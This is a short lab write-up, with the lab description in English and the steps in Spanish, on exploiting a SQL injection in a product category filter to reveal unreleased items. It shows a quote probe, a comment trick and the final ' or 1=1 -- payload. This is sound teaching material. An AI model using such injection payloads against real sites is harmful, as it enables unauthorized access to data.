---
title: "Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
date: 2025-11-02
category: "SQL Injection"
order: 2
tags: ["web-security-academy", "sql-injection", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-where-clause-hidden-data.html
---

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

## Paso 1 — Probar con una comilla simple

```sql
SELECT * FROM products WHERE category = ''' AND released = 1
```

El servidor devuelve un error, lo que sugiere que es muy probable que sea vulnerable a SQL Injection.

## Paso 2 — Comentar el resto de la consulta

```sql
SELECT * FROM products WHERE category = ''--' AND released = 1
```

Acá se comenta la parte de `released`, pero no retorna nada porque entre las comillas no hay ninguna categoría válida.

## Paso 3 — Payload final

Ya sabiendo que es vulnerable, se ejecuta:

```sql
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
```

Como `1=1` es siempre verdadero, la condición completa se cumple para todas las filas — la consulta retorna todos los productos, incluyendo los no lanzados. Lab resuelto.
